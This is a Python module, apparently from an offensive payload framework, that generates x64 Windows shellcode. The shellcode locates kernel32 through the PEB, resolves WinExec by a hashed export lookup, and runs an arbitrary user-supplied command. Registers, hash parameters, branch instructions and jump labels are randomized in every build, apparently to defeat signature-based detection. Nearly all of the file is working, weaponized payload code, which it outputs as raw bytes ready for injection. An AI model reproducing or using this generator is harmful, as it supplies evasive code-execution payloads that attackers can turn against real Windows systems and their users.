########################################################
### WinExec Shellcode Module
### Status: migrated to 082
###
### DiceWare wordlist: https://github.com/ulif/diceware/blob/master/diceware/wordlists/wordlist_en_eff.txt
###
########################################################

#from utils.const import variable_instruction_set
from utils.asm import variable_instruction_set
from utils.binary import get_coff_section
from utils.const import nasm
from utils.hashes import FunctionHash
from utils.helper import nstate, GetFileInfo
from subprocess import run
import os

CATEGORY    = 'payload'
DESCRIPTION = 'Generate a dynamic WinExec shellcode'

def register_arguments(parser):
    parser.add_argument('-c', '--command-line', required=True, help='Command to execute with WinExec')
    parser.add_argument('-o', '--output', required=True, help='Output file')
    opt = parser.add_argument_group('additional')
    opt.add_argument('-d', '--debug', action='store_true', default=False, help='Save nasm code only')
    #opt.add_argument('-n', '--no-comment', action='store_true', default=False, help='No comments in nasm file')
    opt.add_argument('-r', '--random-label', action='store_true', default=False, help='Replace jump labels with random words')

class module:
    Author = 'psycore8'
    Version = '0.1.2'
    DisplayName = 'WinEXEC'
    opcode = ''
    size = 0
    hash = ''
    relay_input = False
    relay_output = False

    def __init__(self, command_line, debug, output, random_label):
        self.command_line = command_line
        self.debug = debug
        self.output = output
        self.random_label = random_label

    def msg(self, message_type, MsgVar=str, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n', 
            'proc.try'       : f'{nstate.s_note} Try to generate shellcode',
            'proc.output_ok' : f'{nstate.s_ok} {MsgVar}',
            'proc.output_try': f'{nstate.s_note} Writing to file {self.output}',
            'm.note'         : f'{nstate.s_note} {MsgVar}',
            'm.ok'           : f'{nstate.s_ok} {MsgVar}',
            'error.output'   : f'{nstate.s_fail} File {self.output} not found or cannot be opened.',
            'post.done'      : f'{nstate.s_ok} DONE!'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def process(self):
        m = self.msg
        m('pre.head')
        m('proc.try')
        fn_root, fn_extension = os.path.splitext(self.output)
        fn_nasm = f'{fn_root}.nasm'
        fn_obj = f'{fn_root}.obj'
        self.opcode = self.generate_shellcode()
        if self.debug:
            m('proc.output_try')
            if self.write_outputfile(fn_nasm):
                size, hash = GetFileInfo(fn_nasm)
                m('proc.output_ok', f'File {fn_nasm} created\n{nstate.s_ok} Size {size} bytes\n{nstate.s_ok} Hash: {hash}')
            else:
                m('error.output', '', True)
        else:
            self.write_outputfile(fn_nasm)
            m('m.note', 'Compiling object file')
            run([nasm, '-f', 'win64', fn_nasm, '-o', fn_obj])
            m('m.note', 'Extract .text section from object file')
            sc = get_coff_section(fn_obj, '.text')
            if self.relay_output:
                return sc
            else:
                m('proc.output_try')
                self.opcode = sc
                if self.write_outputfile(self.output):
                    size, hash = GetFileInfo(self.output)
                    m('proc.output_ok', f'File {self.output} created\n{nstate.s_ok} Size {size} bytes\n{nstate.s_ok} Hash: {hash}')
                else:
                    m('error.output', None, True)
        m('post.done')

    def write_outputfile(self, filename):
        try:
            if isinstance(self.opcode, str):
                file_flags = 'w'
            else:
                file_flags = 'wb'
            with open(filename, file_flags) as f:
                f.write(self.opcode)
            return True
        except:
            return False

    def generate_shellcode(self):
        vi = variable_instruction_set(16)
        fh = FunctionHash()
        
        # randomize instructions
        # r9 variable is used as jump register
        rax, rbx, rcx, rdx, r8, r9, rsi, rdi, r10, r11 = vi.random.sample(vi.multi_bit_registers, 10)
        rc = vi.random.choice

        hash_algorithm = rc(vi.hash_algorithm)
        shift_bits = vi.random.randint(1, 255)

        if hash_algorithm == 'rol':
            winexec_hash = fh.rol_hash('WinExec', shift_bits)
        else:
            winexec_hash = fh.ror_hash('WinExec', shift_bits)

        if self.random_label:
            lb_findFuncPos, lb_HashLoop, lb_HashCompare, lb_WinExecFound, lb_InvokeWinExec, lb_exit = vi.generate_jump_label()
        else:
            lb_findFuncPos = 'findFuncPos'
            lb_exit = 'exit'
            lb_HashCompare = 'HashCompare'
            lb_HashLoop = 'HashLoop'
            lb_InvokeWinExec = 'InvokeWinExec'
            lb_WinExecFound = 'WinExecFound'
        # lb_HashLoop         = vi.generate_jump_label()
        # lb_HashCompare      = vi.generate_jump_label()
        # lb_WinExecFound     = vi.generate_jump_label()
        # lb_InvokeWinExec    = vi.generate_jump_label()
        # lb_exit             = vi.generate_jump_label()

        # prepare command string for the stack
        stacked_command_list = []
        #padded_bytes = 0
        spacer = ' ' * 16
        stacked_command_list = vi.prepare_str_to_stack(self.command_line, rcx[0])
        stacked_command = f'\n{spacer}'.join(stacked_command_list)

        shellcode = f"""
            bits 64
            section .text
                global _start
                
            _start:

                push rbp
                mov rbp, rsp
                sub rsp, 40h
                {vi.zero_register(rax[0])}

                ; ### reserve memory for local variables ###
                ; 08h: Number of functions
                ; 10h: Address table
                ; 18h: Name pointer table
                ; 20h: Ordinal table
                ; 28h: not used (pointer to WinExec string)
                ; 30h: not used (address to WinExec function)
                ; 38h: reserved
                mov [rbp - 08h], {rax[0]}     
                mov [rbp - 10h], {rax[0]}   
                mov [rbp - 18h], {rax[0]}   
                mov [rbp - 20h], {rax[0]}
                mov [rbp - 28h], {rax[0]}
                mov [rbp - 30h], {rax[0]}
                mov [rbp - 38h], {rax[0]} 

                ; ### find kernel32.dll base ###
                ; peb           = gs + 60h
                ; ldr           = peb + 18h
                ; ModuleList    = ldr + 20h
                ; ModuleList    -> Process
                ; ModuleList    -> NTDLL
                ; ModuleList    -> KERNEL32 + 20h
                ; kernel32 base -> rbx
                mov {rax[0]}, gs:[{rax[0]} + 60h]
                mov {rax[0]}, [{rax[0]} + 18h]
                mov {rax[0]}, [{rax[0]} + 20h]
                mov {rbx[0]}, [{rax[0]}]
                mov {rax[0]}, [{rbx[0]}]
                mov {rax[0]}, [{rax[0]} + 20h]
                mov {rbx[0]}, {rax[0]}

                ; ### find export table ###
                ; base + 0x3c               = RVA PE Signature
                ; RVA PE Signature + base   = VA PE Signature
                ; VA PE Signature + 0x88    = RVA Export Table
                ; RVA Export Table          -> rax
                ; RVA Export Table + base   = VA Export Table

                {vi.zero_register(rcx[0])}
                mov {rax[1]}, [{rbx[0]} + 0x3c] 
                add {rax[0]}, {rbx[0]} 
                mov {rcx[3]}, 88h 
                mov {rax[1]}, [{rax[0]} + {rcx[0]}] 
                add {rax[0]}, {rbx[0]} 

                ; ### extract data and save in local variables ###
                ; Export Table + 0x14           = Number of Functions
                ; Export Table + 0x1c           = RVA Address Table
                ; Export table + 0x20           = RVA Name Pointer Table
                ; Export Table + 0x24           = RVA Ordinal Table
                ; RVA Address Table + Base      = VA Address Table
                ; RVA Name Pointer Table + Base = VA Name Pointer Table
                ; RVA Ordinal Table + Base      = VA Ordinal Table

                mov {rcx[1]}, [{rax[0]} + 0x14]  
                mov [rbp - 8h], {rcx[0]}      
                mov {rcx[1]}, [{rax[0]} + 0x1c]  
                add {rcx[0]}, {rbx[0]}    
                mov [rbp - 10h], {rcx[0]}  
                mov {rcx[1]}, [{rax[0]} + 0x20]  
                add {rcx[0]}, {rbx[0]}    
                mov [rbp - 18h], {rcx[0]}  
                mov {rcx[1]}, [{rax[0]} + 0x24]   
                add {rcx[0]}, {rbx[0]}    
                mov [rbp - 20h], {rcx[0]}  

                {vi.zero_register(rax[0])}
                {vi.zero_register(rcx[0])}
                mov {rcx[1]}, [rbp - 8h]    
                mov {rsi[0]}, [rbp - 18h]          

            {lb_findFuncPos}:
                {vi.zero_register(r8[0])}  
                mov {rax[1]}, [rbp - 8h]
                sub {rax[1]}, {rcx[1]}
                mov {rdi[1]}, [{rsi[0]}]
                add {rdi[0]}, {rbx[0]}

            {lb_HashLoop}:
                {vi.zero_register(rdx[0])}
                mov {rdx[3]}, [{rdi[0]}]
                {rc(vi.test_condition)} {rdx[3]}, {rdx[3]}
                {rc(vi.jump_conditional_positive)} {lb_HashCompare}
                {hash_algorithm} {r8[1]}, {shift_bits}       
                add {r8[1]}, {rdx[1]}
                {vi.increase_register(rdi[0])}
                jmp {lb_HashLoop}

            {lb_HashCompare}:
                cmp {r8[1]}, {hex(winexec_hash)}   
                {rc(vi.jump_conditional_positive)} {lb_WinExecFound}
                
                add {rsi[0]}, 4                
                {vi.decrease_register(rcx[0])}
                cmp {rcx[0]}, 0
                {rc(vi.jump_conditional_negative)} {lb_findFuncPos}
                jmp {lb_exit}

            {lb_WinExecFound}:
                ; load ordinal_table
                ; load address_table
                ; calculate WinExec ordinal
                ; calculate WinExec RVA
                ; calculate WinExec VA
                ; move WinExec VA into rax
                mov {rcx[0]}, [rbp - 20h]
                mov {rdx[0]}, [rbp - 10h] 
                mov {rcx[2]}, [{rcx[0]} + {rax[0]} * 2]
                mov {rax[1]}, [{rdx[0]} + {rax[0]} * 4]
                add {rax[0]}, {rbx[0]}
                mov rax, {rax[0]}

            {lb_InvokeWinExec}:
                push rcx 
                ; begin stacked_command
                {stacked_command}
                ; end stacked_command

                ; rcx = command
                ; uCmdSHow = SW_SHOWDEFAULT
                ; 16-byte Stack Alignment
                ; STACK + 32 Bytes (shadow spaces)
                ; call WinExec
                mov rcx, rsp               
                mov dl, 0x1                
                and rsp, -16               
                sub rsp, 32                
                call rax                   

                ; clear stack
                ; local variables
                ; pushes for ebp and WinExec
                ; pushes for WinExec invokation
                add rsp, 38h                 
                add rsp, 18h                 
                add rsp, 8h                  
                pop rbp
                ret

            {lb_exit}:
                ret
        """
        return shellcode